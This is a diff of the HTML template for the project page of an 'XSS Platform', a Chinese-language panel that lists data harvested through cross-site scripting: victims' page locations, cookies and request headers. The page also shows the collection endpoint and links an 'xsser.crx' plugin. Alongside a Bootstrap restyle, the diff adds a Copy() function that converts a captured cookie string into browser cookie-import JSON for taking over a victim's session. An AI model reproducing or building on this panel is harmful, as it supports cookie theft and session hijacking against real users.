@@ -1,16 +1,17 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
+<!DOCTYPE html>
+<html>
 <head>
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta charset="utf-8">
 <title>XSS Platform</title>
-<link rel="stylesheet" href="{$url.themePath}/style/screen.css" type="text/css" media="screen, projection"> 
-<link rel="stylesheet" href="{$url.themePath}/style/print.css" type="text/css" media="print"> 
-<!--[if lt IE 8]><link rel="stylesheet" href="{$url.themePath}/style/ie.css" type="text/css" media="screen, projection"><![endif]-->
-<link rel="stylesheet" href="{$url.themePath}/style/style.css" type="text/css" media="screen, projection">
-<script type="text/javascript" src="{$url.root}/source/js/jquery.js"></script>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="{$url.themePath}/css/bootstrap.min.css">
+<link rel="stylesheet" href="{$url.themePath}/css/bootstrap-theme.min.css">
+<link rel="stylesheet" href="{$url.themePath}/css/css.css">
+<script src="http://code.jquery.com/jquery-1.9.1.min.js"></script>
+<script src="http://www.bootstrapcdn.com/bootstrap/2.3.1/js/bootstrap.min.js"></script>
 {literal}
 <style>
-ul { margin:0; width:220px; overflow:scroll-x; word-break:break-all}
+#ul1 { margin:0; width:220px; overflow:scroll-x; word-break:break-all}
 .ohidden ul { height:18px; overflow:hidden }
 a.oall,a.un { text-decoration:none }
 td { vertical-align:top }
@@ -69,20 +70,60 @@ function CheckAll(obj){
 		$(".checon").removeAttr("checked");
 	}
 }
+function Copy(obj) { 
+  var table = $(obj).parent().parent(); 
+  var l = table.find("#location").text(); 
+  var c = table.find("#cookie").text(); 
+  var t = l.split('//')[1]; 
+  t = t.split('/')[0]; 
+  var d = ""; 
+  var t2 = t.split('.'); 
+  for (key in t2) { 
+    if (key == 0) { 
+      continue; 
+    } 
+    d = d + '.' + t2[key]; 
+  }; 
+  var arr = c.split(';'); 
+  var data = []; 
+  for (var key in arr) { 
+    var arr2 = arr[key].split('='); 
+    data.push(cookie(d,arr2[0], arr2[1])); 
+  } 
+  alert(JSON.stringify(data)); 
+} 
+
+function cookie(d,n,v) 
+{ 
+  var row ={     
+    "domain" : d, 
+    "expirationDate" : Math.round(new Date().getTime()/1000)+3600, 
+    "hostOnly" : false, 
+    "httpOnly" : false, 
+    "name" : n.replace(/^\s+|\s+$/g,''), 
+    "path" : "\/", 
+    "secure" : false, 
+    "session" : false, 
+    "storeId" : "0", 
+    "value" : v.replace(/^\s+|\s+$/g,'') 
+    }; 
+  return row; 
+}
 </script>
 {/literal}
 </head>
 <body>
-<div class="container">
 {include file="header.html"}
+<div class="container">
 {include file="menus.html"}
-<div class="span-19 right">
-<p>当前位置： <a href="{$url.root}/index.php">首页</a> > 项目内容</p>
-<table border="0" cellspacing="0" cellpadding="0">
-	<caption>
+<div class="col-sm-9">
+          <div class="panel panel-default">
+    	<div class="panel-heading">项目内容<a style="font-size:12px; margin-left:10px; float:right;" href="{$url.root}/index.php?do=project&act=viewcode&id={$project.id}">查看代码</a>
+    	<a style="font-size:12px;float:right;" href="{$url.root}/index.php?do=project&act=setcode&id={$project.id}">配置</a>
+		</div>
+<table class="table" border="0" cellspacing="0" cellpadding="0">
+	<div style="padding: 10px 15px;">
     <h3>
-    	<a class="right" style="font-size:12px; margin-left:10px" href="{$url.root}/index.php?do=project&act=viewcode&id={$project.id}">查看代码</a>
-    	<a class="right" style="font-size:12px" href="{$url.root}/index.php?do=project&act=setcode&id={$project.id}">配置</a>
     	项目名称: {$project.title}
     </h3>
     Domain: 
@@ -93,16 +134,16 @@ function CheckAll(obj){
         {/foreach}
     </select> 
     <br />
-    接口地址: {$url.root}/do/auth/{$project.authCode} ( 加 /domain/xxx 可通过域名过滤内容) <a id="plugin" href="/xsser.crx" download><button>安装插件</button></a>
-    </caption>
+    接口地址: {$url.root}/do/auth/{$project.authCode} ( 加 /domain/xxx 可通过域名过滤内容) <a id="plugin" href="/xsser.crx" download><button class="btn btn-success">安装插件</button></a>
+    </div>
 	<thead>
 		<tr>
 			<th width="20"><input type="checkbox" id="checkall" onclick="CheckAll(this)" /></th>
-        	<th width="40"><a href="javascript:void(0)" class="oall" style="font-weight:normal">+全部</a></th>
+        	<th width="60"><a href="javascript:void(0)" class="oall" style="font-weight:normal">+全部</a></th>
         	<th width="120">时间</th>
         	<th width="220">接收的内容</th>
 			<th width="220">Request Headers</th>
-            <th width="30">操作</th>
+            <th width="80">操作</th>
 		</tr>
 	</thead>
 	<tbody>
@@ -112,25 +153,30 @@ function CheckAll(obj){
         	<td><a href="javascript:void(0)" class="un">+展开</a></td>
         	<td>{$v.addTime|@date_format:"%Y-%m-%d %H:%M:%S"}</td>
 			<td>
-                <ul>
+                <ul id="ul1">
                 {foreach from=$v.content key=ck item=c}
                 <li>{$ck} : {$c}</li>
                 {/foreach}	
                 </ul>
             </td>
             <td>
-                <ul>
+                <ul id="ul1">
                 {foreach from=$v.serverContent key=sk item=s}
                 <li>{$sk} : {$s}</li>
                 {/foreach}	
                 </ul>
             </td>
-            <td><a href="javascript:void(0)" onclick="Delete('{$v.id}',this,'{$show.user.token}')">删除</a></td>
+            <td><a href="javascript:void(0)" onclick="Delete('{$v.id}',this,'{$show.user.token}')">删除</a>
+			<!--
+			&nbsp;&nbsp;<a href="javascript:void(0)" onclick="Copy(this)">复制</a> 
+			-->
+			</td>
 		</tr>
 		{/foreach}
 	</tbody>
 </table>
 <div style="padding:5px 10px">选中项操作：<a href="javascript:void(0)" onclick="MutiDelete()">删除</a></div>
+</div>
 </div>
 </div>
 <input type="hidden" id="token" value="{$show.user.token}" />
